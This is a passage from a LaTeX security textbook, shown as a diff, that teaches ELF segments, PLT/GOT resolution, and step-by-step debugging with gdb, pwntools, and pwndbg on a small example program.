+  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040
+                 0x00000000000001f8 0x00000000000001f8  R E    8
+  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238
+                 0x000000000000001c 0x000000000000001c  R      1
+      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
+                 0x00000000000006fc 0x00000000000006fc  R E    200000
+  LOAD           0x0000000000000e10 0x0000000000600e10 0x0000000000600e10
+                 0x0000000000000228 0x0000000000000230  RW     200000
+  DYNAMIC        0x0000000000000e28 0x0000000000600e28 0x0000000000600e28
+                 0x00000000000001d0 0x00000000000001d0  RW     8
+  NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254
+                 0x0000000000000044 0x0000000000000044  R      4
+  GNU_EH_FRAME   0x00000000000005d0 0x00000000004005d0 0x00000000004005d0
+                 0x0000000000000034 0x0000000000000034  R      4
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RW     10
+  GNU_RELRO      0x0000000000000e10 0x0000000000600e10 0x0000000000600e10
+                 0x00000000000001f0 0x00000000000001f0  R      1
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     
+   01     .interp 
+   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 
+   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
+   04     .dynamic 
+   05     .note.ABI-tag .note.gnu.build-id 
+   06     .eh_frame_hdr 
+   07     
+   08     .init_array .fini_array .jcr .dynamic .got 
+> 
+\end{lstlisting}
+
+This shows us the segments, their permissions, and which sections are contained
+in each segment. For example, the \texttt{.data} and \texttt{.bss} sections are
+located in the third segment, which has a type of \texttt{LOAD}. We also see
+that this segment has both read and write permissions.
+
+% Shared libraries
+\subsubsection{PLT and GOT}
+One of the most useful attributes of ELF binaries is the fact that they can use
+each other's data through a process called linking. In fact, there are binaries
+called \emph{shared libraries} or shared objects whose sole purpose is to be
+linked with other binaries. Although linking is conceptually simple, its
+implementation is rather complex due to the fact that shared libraries must
+function properly regardless of where they are loaded into memory. This means
+that ELF binaries need some way to determine the locations of their shared
+library functions at runtime. ELF binaries use two data structures to achieve
+this - the Procedure Linkage Table (PLT) and Global Offset Table (GOT).
+
+The PLT is a list of code stubs which are called in place of shared library
+functions, and the GOT is a list of pointers where the PLT will redirect
+execution. Each shared library function in the ELF has an entry in both the PLT
+and the GOT. The first entry in the PLT is used to call a special subroutine
+called the resolver, which will locate a shared library function, write its
+location to the GOT, and execute it. Each PLT entry other than the first
+consists of a jump to the corresponding address in the GOT, a push onto the
+stack to prepare the resolver, and a jump to the resolver. When the program is
+first loaded, each shared function's GOT entry points back to the PLT
+instructions to prepare and call the resolver. When the function is first
+called, the resolver is responsible for finding the address of the function in
+libc (or another library), writing it to the GOT, and calling the function.  On
+subsequent calls the PLT will use the previously filled GOT entry to redirect
+execution directly to the library code. In this way, the GOT and PLT ensure that
+each shared library function is only resolved once.
+
+% gdb
+\subsection{Stepping through with GDB}
+We can use a debugger to step through an ELF file's execution one instruction at
+a time, inspecting and modifying its data as we please. This is a powerful tool
+for learning about a new executable. We're going to use the GNU debugger (GDB),
+since it is widely available and very powerful. To start debugging a program,
+run \texttt{gdb <program>}. Not much will happen, since \texttt{gdb} is run only
+through the command line.
+
+\begin{lstlisting}
+> gdb elf
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from elf...(no debugging symbols found)...done.
+(gdb) 
+\end{lstlisting}
+
+It's useful to have a few survival gdb commands to get started. These can get
+you pretty far:
+
+\begin{itemize}
+    \item help - get information on how to use a command
+    \item disassemble - show disassembly of a function
+    \item break - set a breakpoint
+    \item run - run the program from the beginning
+    \item where - display your current location
+    \item info registers - display register status
+    \item info breakpoints - display breakpoint status
+    \item x - examine memory
+    \item display - display memory at each breakpoint
+    \item nexti - execute an instruction without following jumps / calls
+    \item stepi - execute an instruction following jumps / calls
+    \item continue - resume execution from a breakpoint
+\end{itemize}
+
+As explained in the welcome message, you can use \texttt{help} or
+\texttt{apropos} to get information if you get lost.
+
+If you type part of a command and press tab twice, \texttt{gdb} will suggest
+ways to finish the command. If there is only one way to complete the command you
+\emph{could} press tab to finish the command, but \texttt{gdb} will actually
+execute the completed command automatically. This walkthrough will use the full
+commands so that you can see them, but as you use the commands more, you'll want
+to start using the abbreviated versions.
+
+To start, we can view the disassembly of \texttt{main()} by running
+\texttt{disassemble main}. However, by default this will display the assembly in
+AT\&T syntax. To switch to Intel syntax, run \texttt{set disassembly intel}.
+
+\begin{lstlisting}
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x00000000004005f6 <+0>:	push   rbp
+   0x00000000004005f7 <+1>:	mov    rbp,rsp
+   0x00000000004005fa <+4>:	sub    rsp,0x10
+   0x00000000004005fe <+8>:	mov    rax,QWORD PTR fs:0x28
+   0x0000000000400607 <+17>:	mov    QWORD PTR [rbp-0x8],rax
+   0x000000000040060b <+21>:	xor    eax,eax
+   0x000000000040060d <+23>:	mov    edi,0x4006d4
+   0x0000000000400612 <+28>:	call   0x4004b0 <puts@plt>
+   0x0000000000400617 <+33>:	lea    rax,[rbp-0xc]
+   0x000000000040061b <+37>:	mov    rsi,rax
+   0x000000000040061e <+40>:	mov    edi,0x4006e0
+   0x0000000000400623 <+45>:	mov    eax,0x0
+   0x0000000000400628 <+50>:	call   0x4004e0 <__isoc99_scanf@plt>
+   0x000000000040062d <+55>:	mov    eax,0x0
+   0x0000000000400632 <+60>:	mov    rdx,QWORD PTR [rbp-0x8]
+   0x0000000000400636 <+64>:	xor    rdx,QWORD PTR fs:0x28
+   0x000000000040063f <+73>:	je     0x400646 <main+80>
+   0x0000000000400641 <+75>:	call   0x4004c0 <__stack_chk_fail@plt>
+   0x0000000000400646 <+80>:	leave  
+   0x0000000000400647 <+81>:	ret    
+End of assembler dump.
+(gdb) 
+\end{lstlisting}
+
+To pause execution at the start of \texttt{main()}, we'll first set a breakpoint
+there, then run the program.
+
+\begin{lstlisting}
+(gdb) break main
+Breakpoint 1 at 0x4005fa
+(gdb) run
+Starting program: /home/devneal/Security/REFE/textbook/elf 
+
+Breakpoint 1, 0x00000000004005fa in main ()
+(gdb) 
+\end{lstlisting}
+
+From here we can verify our location with the \texttt{where} and \texttt{info
+registers} commands. Since we only need to see the location of \texttt{rip}, we
+can use \texttt{info register rip} to see it exclusively.
+
+\begin{lstlisting}
+(gdb) where
+#0  0x00000000004005fa in main ()
+(gdb) info register rip
+rip            0x4005fa	0x4005fa <main+4>
+(gdb) 
+\end{lstlisting}
+
+From here we can use the \texttt{x} command to examine the state of the program.
+\texttt{x/5i \$rip} will display the next 5 instructions to be executed, and
+\texttt{x/8xw \$rsp} will display the first 5 hexadecimal words on the top of
+the stack. You can get more information on how to use \texttt{x} with
+\texttt{help x}.
+
+\begin{lstlisting}
+(gdb) x/5i $rip
+=> 0x4005fa <main+4>:	sub    rsp,0x10
+   0x4005fe <main+8>:	mov    rax,QWORD PTR fs:0x28
+   0x400607 <main+17>:	mov    QWORD PTR [rbp-0x8],rax
+   0x40060b <main+21>:	xor    eax,eax
+   0x40060d <main+23>:	mov    edi,0x4006d4
+(gdb) x/8xw $rsp
+0x7fffffffdee0:	0x00400650	0x00000000	0xf7a2d830	0x00007fff
+0x7fffffffdef0:	0x00000000	0x00000000	0xffffdfc8	0x00007fff
+(gdb) 
+\end{lstlisting}
+
+From the output above, we can see that the next instruction will subtract
+\texttt{0x10} from \texttt{\$rsp}. We can execute this instruction by running
+\texttt{nexti} and verify that it behaved as expected.
+
+\begin{lstlisting}
+(gdb) nexti
+0x00000000004005fe in main ()
+(gdb) x/5i $rip
+=> 0x4005fe <main+8>:	mov    rax,QWORD PTR fs:0x28
+   0x400607 <main+17>:	mov    QWORD PTR [rbp-0x8],rax
+   0x40060b <main+21>:	xor    eax,eax
+   0x40060d <main+23>:	mov    edi,0x4006d4
+   0x400612 <main+28>:	call   0x4004b0 <puts@plt>
+(gdb) x/8xw $rsp
+0x7fffffffded0:	0xffffdfc0	0x00007fff	0x00000000	0x00000000
+0x7fffffffdee0:	0x00400650	0x00000000	0xf7a2d830	0x00007fff
+(gdb) 
+\end{lstlisting}
+
+As expected, \texttt{rip} is now pointing at the next instruction and
+\texttt{rsp} has been decremented by \texttt{0x10} (4 words). We can use the
+\texttt{display} command to view \texttt{rip} and \texttt{rsp} every time
+execution stops.
+
+\begin{lstlisting}
+(gdb) display/5i $rip
+1: x/5i $rip
+=> 0x4005fe <main+8>:	mov    rax,QWORD PTR fs:0x28
+   0x400607 <main+17>:	mov    QWORD PTR [rbp-0x8],rax
+   0x40060b <main+21>:	xor    eax,eax
+   0x40060d <main+23>:	mov    edi,0x4006d4
+   0x400612 <main+28>:	call   0x4004b0 <puts@plt>
+(gdb) display/5xw $rsp
+2: x/5xw $rsp
+0x7fffffffded0:	0xffffdfc0	0x00007fff	0x00000000	0x00000000
+0x7fffffffdee0:	0x00400650
+(gdb) 
+\end{lstlisting}
+
+Use the \texttt{nexti} command to step through a few more instructions, and
+the stack and instruction pointers will update automatically.
+
+Next we'll set a breakpoint at the call to \texttt{scanf()}. We can find
+location of the \texttt{call} instruction with \texttt{disassemble}, set a
+breakpoint there with \texttt{break}, and stop at it with \texttt{continue}.
+
+\begin{lstlisting}
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x00000000004005f6 <+0>:	push   rbp
+   0x00000000004005f7 <+1>:	mov    rbp,rsp
+   0x00000000004005fa <+4>:	sub    rsp,0x10
+   0x00000000004005fe <+8>:	mov    rax,QWORD PTR fs:0x28
+   0x0000000000400607 <+17>:	mov    QWORD PTR [rbp-0x8],rax
+   0x000000000040060b <+21>:	xor    eax,eax
+   0x000000000040060d <+23>:	mov    edi,0x4006d4
+   0x0000000000400612 <+28>:	call   0x4004b0 <puts@plt>
+   0x0000000000400617 <+33>:	lea    rax,[rbp-0xc]
+   0x000000000040061b <+37>:	mov    rsi,rax
+   0x000000000040061e <+40>:	mov    edi,0x4006e0
+   0x0000000000400623 <+45>:	mov    eax,0x0
+   0x0000000000400628 <+50>:	call   0x4004e0 <__isoc99_scanf@plt>
+   0x000000000040062d <+55>:	mov    eax,0x0
+   0x0000000000400632 <+60>:	mov    rdx,QWORD PTR [rbp-0x8]
+   0x0000000000400636 <+64>:	xor    rdx,QWORD PTR fs:0x28
+   0x000000000040063f <+73>:	je     0x400646 <main+80>
+   0x0000000000400641 <+75>:	call   0x4004c0 <__stack_chk_fail@plt>
+   0x0000000000400646 <+80>:	leave  
+   0x0000000000400647 <+81>:	ret    
+End of assembler dump.
+(gdb) break *0x400628
+Breakpoint 2 at 0x400628
+(gdb) run
+Starting program: /home/devneal/Security/REFE/textbook/elf 
+
+Breakpoint 1, 0x00000000004005fa in main ()
+1: x/5i $rip
+=> 0x4005fa <main+4>:	sub    rsp,0x10
+   0x4005fe <main+8>:	mov    rax,QWORD PTR fs:0x28
+   0x400607 <main+17>:	mov    QWORD PTR [rbp-0x8],rax
+   0x40060b <main+21>:	xor    eax,eax
+   0x40060d <main+23>:	mov    edi,0x4006d4
+2: x/5xw $rsp
+0x7fffffffdee0:	0x00400650	0x00000000	0xf7a2d830	0x00007fff
+0x7fffffffdef0:	0x00000000
+(gdb) continue 
+Continuing.
+ELF example
+
+Breakpoint 2, 0x0000000000400628 in main ()
+1: x/5i $rip
+=> 0x400628 <main+50>:	call   0x4004e0 <__isoc99_scanf@plt>
+   0x40062d <main+55>:	mov    eax,0x0
+   0x400632 <main+60>:	mov    rdx,QWORD PTR [rbp-0x8]
+   0x400636 <main+64>:	xor    rdx,QWORD PTR fs:0x28
+   0x40063f <main+73>:	je     0x400646 <main+80>
+2: x/5xw $rsp
+0x7fffffffded0:	0xffffdfc0	0x00007fff	0x3f318f00	0xf8ca2299
+0x7fffffffdee0:	0x00400650
+(gdb) 
+\end{lstlisting}
+
+Now we can examine the arguments to \texttt{scanf()}. The first is a format
+string, which can be read by passing the \texttt{/s} flag to \texttt{x}, and the
+second is the address on the stack where the input will be stored.
+
+\begin{lstlisting}
+(gdb) info registers $rdi $rsi
+rdi            0x4006e0	4196064
+rsi            0x7fffffffded4	140737488346836
+(gdb) x/s 0x4006e0
+0x4006e0:	"%d\n"
+(gdb) 
+\end{lstlisting}
+
+You can use the \texttt{stepi} instruction to step into the call to
+\texttt{scanf()}. Take a look around, then return to \texttt{main()} with the
+\texttt{return} command.
+
+\begin{lstlisting}
+(gdb) stepi 
+0x00000000004004e0 in __isoc99_scanf@plt ()
+1: x/5i $rip
+=> 0x4004e0 <__isoc99_scanf@plt>:	
+    jmp    QWORD PTR [rip+0x200b4a]        # 0x601030
+   0x4004e6 <__isoc99_scanf@plt+6>:	push   0x3
+   0x4004eb <__isoc99_scanf@plt+11>:	jmp    0x4004a0
+   0x4004f0:	jmp    QWORD PTR [rip+0x200b02]        # 0x600ff8
+   0x4004f6:	xchg   ax,ax
+2: x/5xw $rsp
+0x7fffffffdec8:	0x0040062d	0x00000000	0xffffdfc0	0x00007fff
+0x7fffffffded8:	0x3f318f00
+(gdb) where
+#0  0x00000000004004e0 in __isoc99_scanf@plt ()
+#1  0x000000000040062d in main ()
+(gdb) disassemble 
+Dump of assembler code for function __isoc99_scanf@plt:
+=> 0x00000000004004e0 <+0>:	jmp    QWORD PTR [rip+0x200b4a]        # 0x601030
+   0x00000000004004e6 <+6>:	push   0x3
+   0x00000000004004eb <+11>:	jmp    0x4004a0
+End of assembler dump.
+(gdb) return
+Make selected stack frame return now? (y or n) y
+#0  0x000000000040062d in main ()
+(gdb) 
+\end{lstlisting}
+
+From here you can exit \texttt{gdb} with the \texttt{quit} command. This
+walkthrough has covered enough on \texttt{gdb} to get you started learning about
+it on your own. When in doubt, remember to use the \texttt{help} command or
+check the man page for \texttt{gdb}.
+
+% TODO: shorten \texttt{pwndbg} output
+% TODO: add pipes, redirects, and shell substitution
+% pwntools + pwndbg
+\section{Tools of the Trade}
+By now you already know enough to start learning about and exploiting bugs, but
+you'll quickly find that a lot of the difficulty comes from figuring out how to
+do the things you want to. Interacting with a program, manipulating data, and
+finding the information you need used to involve mastering several different
+ad-hoc utilities. Now we have access to tools that were developed with
+exploitation in mind to make these small tasks as easy as possible so you can
+focus only on finding your exploit.
+
+\subsection{\texttt{pwntools}}
+\texttt{pwntools} is an exploit development framework written for python. It
+consists of several modules, each of which is designed to make a specific task
+much easier.  pwntools has over 40 different modules at the time of writing, but
+we'll only go over a few of the most useful ones here.
+
+\begin{itemize}
+    \item \texttt{pwnlib.tubes} - sending and receiving data
+    \item \texttt{pwnlib.util} - manipulating data
+\end{itemize}
+
+\subsubsection{\texttt{pwnlib.tubes}}
+The \texttt{tubes} module is used for communication between your program and
+just about everything else. It has a number of submodules each of which are used
+to communicate over different interfaces. For example,
+\texttt{pwnlib.tubes.process} can communicate with any program you can run
+locally. Here is an example using some common shell utilities.
+
+\begin{lstlisting}
+>>> p = process("cat")
+>>> p.send("hello")
+>>> p.read()
+'hello'
+>>> p.sendline("goodbye")
+>>> p.readuntil("by")
+'goodby'
+>>> p.readline()
+'e\n'
+>>> p.shutdown()
+>>> p = process(["echo", "test", "string"]) 
+>>> p.readregex(".*str")
+'test str'
+>>> p.readline()
+'ing\n'
+\end{lstlisting}
+
+\texttt{pwnlib.tubes.remote} is used to make a TCP or UDP connection to a remote
+host. Its counterpart, \texttt{pwnlib.tubes.listen} is used to receive those
+connections. An example is given below.
+
+\begin{lstlisting}
+>>> l = listen(8888)
+>>> r = remote("localhost", 8888)
+>>> r.sendline("hello from remote")
+>>> l.readline()
+'hello from remote\n'
+>>> l.send("hello from listen")
+>>> r.readuntil("from")
+'hello from'
+>>> r.read()
+' listen'
+>>> r.send("{\"length\":\"7\", \"type\":\"ascii\", \"data\":\"network\"}")
+>>> l.readregex("\"type\":\".*\"")
+'{"length":"7", "type":"ascii"'
+\end{lstlisting}
+
+You'll notice that the \texttt{remote} and \texttt{listen} classes have some of
+the same methods as the \texttt{process} class. This is the beauty of the
+\texttt{tubes} module; it provides a single interface which can be used to
+communicate with multiple external processes. There are also submodules for
+serial ports and ssh communication, both of which use the same methods in the
+examples above. These methods are described in more detail below.
+
+\begin{itemize}
+    \item \texttt{send} - sends data
+    \item \texttt{sendline} - like send, but appends a newline before sending
+    \item \texttt{read} / \texttt{recv} - receive data
+    \item \texttt{readline} / \texttt{recvline} - receive data until a newline is found and return
+        it
+    \item \texttt{readuntil} / \texttt{recvuntil} receive data until the specified string is found,
+        and return it
+    \item \texttt{readregex} / \texttt{recvregex} - receive data until the specified regex is
+        matched, then return it
+\end{itemize}
+
+\subsubsection{\texttt{pwnlib.util}}
+The \texttt{util} module provides functions for several of the tasks that
+frequently come up when developing exploits. Submodules include the
+\texttt{fiddling} module for bit operations and converting between different
+formats, the \texttt{lists} module for manipulating lists, and the
+\texttt{packing} module for converting between numbers and their equivalent
+data strings.
+
+\begin{lstlisting}
+>>> s = "pwntools is awesome"
+>>> s_hex = enhex(s)
+>>> s_hex
+'70776e746f6f6c7320697320617765736f6d65'
+>>> print hexdump(s)
+00000000  70 77 6e 74  6f 6f 6c 73  20 69 73 20  61 77 65 73  |pwnt│ools│ is │awes|
+00000010  6f 6d 65                                            |ome|
+00000013
+>>> unhex(s_hex) == s
+True
+>>>
+>>> s_ord = ordlist(s)
+>>> s_ord
+[112, 119, 110, 116, 111, 111, 108, 115, 32, 105, 115, 32, 97, 119, 101, 115, 111, 109, 101]
+>>> s_ord[0] += 1
+>>> s = unordlist(s_ord)
+>>> s
+'qwntools is awesome'
+>>>
+>>> val = 0xffffdeadbeefffff
+>>> data = p64(val)
+>>> data
+'\xff\xff\xef\xbe\xad\xde\xff\xff'
+>>> val == u64(data)
+True
+\end{lstlisting}
+
+As before, here is a description of each of the functions and their uses.
+\begin{itemize}
+    \item \texttt{enhex} - convert an ASCII string to hexadecimal
+    \item \texttt{unhex} - convert a hexadecimal string to ASCII
+    \item \texttt{hexdump} - return a hex dump of a hexadecimal string
+    \item \texttt{ordlist} - convert a string to a list of ASCII values
+    \item \texttt{unordlist} - convert a list of ASCII values to a string
+    \item \texttt{p64} - pack an integer into a 64-bit machine word
+    \item \texttt{u64} - unpack a 64-bit machine word into an integer
+\end{itemize}
+
+\subsection{\texttt{pwndbg}}
+Although \texttt{gdb} is nice, it makes it unnecessarily difficult to find some
+of the information we need. \texttt{pwndbg} is an extension to \texttt{gdb}
+written with exploit development in mind. In addition to adding several useful
+commands, it also automatically displays program information at every
+breakpoint.
+
+You can activate \texttt{pwndbg} by either running \texttt{source
+<path\_to\_pwntools>} in \texttt{gdb} or by putting the line in
+\texttt{~./gdbinit}. Below is the output after opening \texttt{elf\_example.c}
+in \texttt{pwndbg}.
+
+\begin{lstlisting}
+> gdb elf
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Loaded 112 commands. Type pwndbg [filter] for a list.
+Reading symbols from elf...(no debugging symbols found)...done.
+pwndbg> 
+\end{lstlisting}
+
+As explained in the help message, you can run \texttt{pwndbg} to display all of
+the commands added by \texttt{pwndbg}, and optionally add a filter to display
+only the commands that match the filter. All of the commands from vanilla
+\texttt{gdb} are still available in \texttt{pwndbg}. This means you can still
+use \texttt{ni}, \texttt{si}, \texttt{x}, etc., as usual.
+
+
+The best way to see what \texttt{pwndbg} has to offer is to just start using it.
+Set a breakpoint at \texttt{main()} and stop at it.
+
+\begin{lstlisting}
+pwndbg> b main
+Breakpoint 1 at 0x4005fa
+pwndbg> r
+Starting program: /home/devneal/Security/REFE/textbook/example_code/elf 
+
+Breakpoint 1, 0x00000000004005fa in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x4005f6 (main) ◂— push   rbp
+ RBX  0x0
+ RCX  0x0
+*RDX  0x7fffffffdfb8 —▸ 0x7fffffffe2ee ◂— 'XDG_VTNR=7'
+*RDI  0x1
+*RSI  0x7fffffffdfa8 —▸ 0x7fffffffe2b8 ◂— 0x65642f656d6f682f ('/home/de')
+*R8   0x4006c0 (__libc_csu_fini) ◂— ret    
+*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
+*R10  0x846
+*R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14
+*R12  0x400500 (_start) ◂— xor    ebp, ebp
+*R13  0x7fffffffdfa0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+*RBP  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+*RIP  0x4005fa (main+4) ◂— sub    rsp, 0x10
+[───────────DISASM───────────]
+ ► 0x4005fa <main+4>     sub    rsp, 0x10
+   0x4005fe <main+8>     mov    rax, qword ptr fs:[0x28]
+   0x400607 <main+17>    mov    qword ptr [rbp - 8], rax
+   0x40060b <main+21>    xor    eax, eax
+   0x40060d <main+23>    mov    edi, 0x4006d4
+   0x400612 <main+28>    call   puts@plt                      <0x4004b0>
+ 
+   0x400617 <main+33>    lea    rax, [rbp - 0xc]
+   0x40061b <main+37>    mov    rsi, rax
+   0x40061e <main+40>    mov    edi, 0x4006e0
+   0x400623 <main+45>    mov    eax, 0
+   0x400628 <main+50>    call   __isoc99_scanf@plt            <0x4004e0>
+[────────────STACK────────────]
+00:0000│ rbp rsp  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+01:0008│          0x7fffffffdec8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+02:0010│          0x7fffffffded0 ◂— 0x0
+03:0018│          0x7fffffffded8 —▸ 0x7fffffffdfa8 —▸ 0x7fffffffe2b8 ◂— 0x65642f656d6f682f ('/home/de')
+04:0020│          0x7fffffffdee0 ◂— 0x1f7ffcca0
+05:0028│          0x7fffffffdee8 —▸ 0x4005f6 (main) ◂— push   rbp
+06:0030│          0x7fffffffdef0 ◂— 0x0
+07:0038│          0x7fffffffdef8 ◂— 0xbfb8facd527a9cd
+[───────────BACKTRACE───────────]
+ ► f 0           4005fa main+4
+   f 1     7ffff7a2d830 __libc_start_main+240
+Breakpoint main
+pwndbg> 
+\end{lstlisting}
+
+\texttt{pwndbg} will automatically display the contents of the registers, the
+disassembled instructions around \texttt{rip}, the top of the stack, and a
+backtrace giving the current chain of function calls. You can display this
+information at any time with the \texttt{context} command. If you only want to
+see one of the sections, run \texttt{context} followed by the name of the
+section.
+
+\texttt{pwndbg} provides the \texttt{nearpc} and \texttt{emulate} commands for
+displaying commands near \texttt{\$rip} (also called the program counter).
+Note that these commands will only display commands that will be executed based
+on the current state of the program. This makes a significant difference when
+analyzing code with lots of jump instructions. Pause execution at the call to
+\texttt{puts()}.
+
+\begin{lstlisting}
+pwndbg> nearpc
+ ► 0x4005fa <main+4>     sub    rsp, 0x10
+   0x4005fe <main+8>     mov    rax, qword ptr fs:[0x28]
+   0x400607 <main+17>    mov    qword ptr [rbp - 8], rax
+   0x40060b <main+21>    xor    eax, eax
+   0x40060d <main+23>    mov    edi, 0x4006d4
+   0x400612 <main+28>    call   puts@plt                      <0x4004b0>
+ 
+   0x400617 <main+33>    lea    rax, [rbp - 0xc]
+   0x40061b <main+37>    mov    rsi, rax
+   0x40061e <main+40>    mov    edi, 0x4006e0
+   0x400623 <main+45>    mov    eax, 0
+   0x400628 <main+50>    call   __isoc99_scanf@plt            <0x4004e0>
+pwndbg> break *main+28
+Breakpoint 2 at 0x400612
+pwnbdg> c
+Continuing.
+
+0x0000000000400612 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[───────────REGISTERS───────────]
+*RAX  0x0
+ RBX  0x0
+ RCX  0x0
+ RDX  0x7fffffffdfb8 —▸ 0x7fffffffe2ee ◂— 'XDG_VTNR=7'
+*RDI  0x4006d4 ◂— and    byte ptr [rbp + 0x78], r12b /* 'ELF example' */
+ RSI  0x7fffffffdfa8 —▸ 0x7fffffffe2b8 ◂— 0x65642f656d6f682f ('/home/de')
+ R8   0x4006c0 (__libc_csu_fini) ◂— ret    
+ R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp
+ R10  0x846
+ R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14
+ R12  0x400500 (_start) ◂— xor    ebp, ebp
+ R13  0x7fffffffdfa0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+*RSP  0x7fffffffdeb0 —▸ 0x7fffffffdfa0 ◂— 0x1
+*RIP  0x400612 (main+28) ◂— call   0x4004b0
+[───────────DISASM───────────]
+   0x4005fa <main+4>     sub    rsp, 0x10
+   0x4005fe <main+8>     mov    rax, qword ptr fs:[0x28]
+   0x400607 <main+17>    mov    qword ptr [rbp - 8], rax
+   0x40060b <main+21>    xor    eax, eax
+   0x40060d <main+23>    mov    edi, 0x4006d4
+ ► 0x400612 <main+28>    call   puts@plt                      <0x4004b0>
+        s: 0x4006d4 ◂— 'ELF example'
+ 
+   0x400617 <main+33>    lea    rax, [rbp - 0xc]
+   0x40061b <main+37>    mov    rsi, rax
+   0x40061e <main+40>    mov    edi, 0x4006e0
+   0x400623 <main+45>    mov    eax, 0
+   0x400628 <main+50>    call   __isoc99_scanf@plt            <0x4004e0>
+[────────────STACK────────────]
+00:0000│ rsp  0x7fffffffdeb0 —▸ 0x7fffffffdfa0 ◂— 0x1
+01:0008│      0x7fffffffdeb8 ◂— 0x4e5d491772575800
+02:0010│ rbp  0x7fffffffdec0 —▸ 0x400650 (__libc_csu_init) ◂— push   r15
+03:0018│      0x7fffffffdec8 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
+04:0020│      0x7fffffffded0 ◂— 0x0
+05:0028│      0x7fffffffded8 —▸ 0x7fffffffdfa8 —▸ 0x7fffffffe2b8 ◂— 0x65642f656d6f682f ('/home/de')
+06:0030│      0x7fffffffdee0 ◂— 0x1f7ffcca0
+07:0038│      0x7fffffffdee8 —▸ 0x4005f6 (main) ◂— push   rbp
+[───────────BACKTRACE───────────]
+ ► f 0           400612 main+28
+   f 1     7ffff7a2d830 __libc_start_main+240
+pwndbg> 
+\end{lstlisting}
+
+Notice how \texttt{pwndbg} will automatically display the arguments to the call
+to \texttt{puts()}, and print it as a string. \texttt{pwndbg} offers several
+ways to display this information. \texttt{db} will display data as bytes,
+\texttt{dw} will display it as words, \texttt{dd} will display it as double
+words, \texttt{dq} will display it as quad words, and \texttt{ds} will display
+it as a string.
+
+\begin{lstlisting}
+pwndbg> db 0x4006d4
+00000000004006d4     45 4c 46 20 65 78 61 6d 70 6c 65 00 25 64 00 00
+00000000004006e4     01 1b 03 3b 30 00 00 00 05 00 00 00 bc fd ff ff
+00000000004006f4     7c 00 00 00 1c fe ff ff 4c 00 00 00 12 ff ff ff
+0000000000400704     a4 00 00 00 6c ff ff ff c4 00 00 00 dc ff ff ff
+pwndbg> dw 0x4006d4
+00000000004006d4     4c45 2046 7865 6d61 6c70 0065 6425 0000
+00000000004006e4     1b01 3b03 0030 0000 0005 0000 fdbc ffff
+00000000004006f4     007c 0000 fe1c ffff 004c 0000 ff12 ffff
+0000000000400704     00a4 0000 ff6c ffff 00c4 0000 ffdc ffff
+pwndbg> dd 0x4006d4
+00000000004006d4     20464c45 6d617865 00656c70 00006425
+00000000004006e4     3b031b01 00000030 00000005 fffffdbc
+00000000004006f4     0000007c fffffe1c 0000004c ffffff12
+0000000000400704     000000a4 ffffff6c 000000c4 ffffffdc
+pwndbg> dq 0x4006d4
+00000000004006d4     6d61786520464c45 0000642500656c70
+00000000004006e4     000000303b031b01 fffffdbc00000005
+00000000004006f4     fffffe1c0000007c ffffff120000004c
+0000000000400704     ffffff6c000000a4 ffffffdc000000c4
+pwndbg> ds 0x4006d4
+4006d4 'ELF example'
+\end{lstlisting}
+
+If you have a list of pointers in memory, you can resolve several of them at
+once with \texttt{dps} or \texttt{telescope}. This tends to be most useful for
+the stack, so if you run the commands with no arguments it will default to the
+stack.
+
+\begin{lstlisting}
+pwndbg> dps
+00:0000│ rsp  0x7fffffffdeb0 —▸ 0x7fffffffdfa0 ◂— 0x1
+01:0008│      0x7fffffffdeb8 ◂— 0x562ac01897d4100
